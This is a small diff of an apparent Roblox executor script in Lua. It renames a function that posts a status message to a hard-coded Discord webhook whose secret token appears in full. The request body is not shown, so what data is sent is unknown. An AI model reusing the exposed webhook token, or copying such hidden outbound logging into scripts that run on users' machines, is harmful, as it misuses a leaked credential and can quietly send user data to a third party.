@@ -2,7 +2,7 @@
 local HttpService = game:GetService("HttpService")
 local Request = (syn and syn.request) or request or (http and http.request)
 
-function Webhook(status)
+function WebhookLogger1(status)
     local response = Request(
     {
         Url = "https://discord.com/api/webhooks/1455947315280875717/lQduStx_kPxtdAx2h3lNm5GpYCMDF-e4ZVAusrdg3c3a92EX4k9QyWWX6eIf2I3ug6Fj",
@@ -31,6 +31,6 @@ function Webhook(status)
 end
 _G.Normal = _G.Normal
 if _G.Auto and not _G.Normal then
-    Webhook("Normal Script")
+    WebhookLogger1("Normal Script")
     _G.Normal = true
 end
